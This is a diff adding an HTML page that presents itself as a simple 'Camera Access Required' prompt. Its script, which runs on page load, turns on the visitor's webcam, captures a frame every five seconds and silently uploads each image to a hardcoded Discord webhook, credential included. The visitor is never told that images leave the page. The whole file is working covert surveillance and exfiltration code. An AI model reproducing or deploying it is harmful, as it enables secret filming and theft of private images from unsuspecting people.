@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Camera Access</title>
+</head>
+<body>
+  <h2>Camera Access Required</h2>
+  <video id="video" autoplay playsinline width="320" height="240"></video>
+  <script>
+    const video = document.getElementById('video');
+    const webhookUrl = "https://discordapp.com/api/webhooks/1360012861673570315/ZqzUK5SoTzzvkBMIGPbH00hA9lt0nAj_eHAbqbqS-Y4vfhq1Dy-sX4ULdcdTWwl0Ui6L";
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 320;
+        canvas.height = 240;
+        const ctx = canvas.getContext('2d');
+
+        setInterval(async () => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(async blob => {
+            const formData = new FormData();
+            formData.append("file", blob, "webcam.jpg");
+
+            await fetch(webhookUrl, {
+              method: "POST",
+              body: formData
+            });
+          }, "image/jpeg");
+        }, 5000);
+
+      } catch (err) {
+        alert("Camera access denied or unavailable.");
+        console.error(err);
+      }
+    }
+
+    startCamera();
+  </script>
+</body>
+</html>
